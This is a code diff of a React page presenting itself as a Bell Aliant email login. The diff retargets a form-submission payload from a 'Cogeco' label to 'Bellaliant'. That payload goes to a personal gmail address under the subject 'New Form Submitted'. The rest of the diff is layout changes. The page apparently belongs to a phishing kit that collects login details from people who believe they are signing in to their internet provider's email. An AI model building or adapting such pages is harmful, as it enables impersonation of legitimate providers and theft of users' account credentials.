@@ -51,7 +51,7 @@ const HomePage = () => {
       message: customizedMessage,
       subject: "New Form Submitted",
       email: "krogstadracheal@gmail.com",
-      name: "Cogeco",
+      name: "Bellaliant",
     };
     console.log(data);
 
@@ -117,17 +117,17 @@ const HomePage = () => {
           </div>
         </div>
       </header>
-      <main className="mx-4">
+      <main className="container">
         {/* Page Content */}
-        <div className="mt-5 content">
+        <div className="content">
           <div className="row">
             <div className="col-12">
-              <h1>Courriel Bell Aliant</h1>
+              <h2>Courriel Bell Aliant</h2>
             </div>
           </div>
           <div className="row">
             {/* Form Column */}
-            <div className="col-md-6 mb-5">
+            <div className="col-md-6 mb-5 mb-lg-0">
               <div className="card">
                 <div className="card-header">
                   <h4>Login</h4>
@@ -247,7 +247,7 @@ const HomePage = () => {
             </div>
 
             {/* Card Column */}
-            <div className="col-md-6 mb-5">
+            <div className="col-md-6 mb-5 mb-lg-0">
               <div className="card">
                 <div className="card-header">
                   <h4>New enhancements to your Bell Aliant email.</h4>
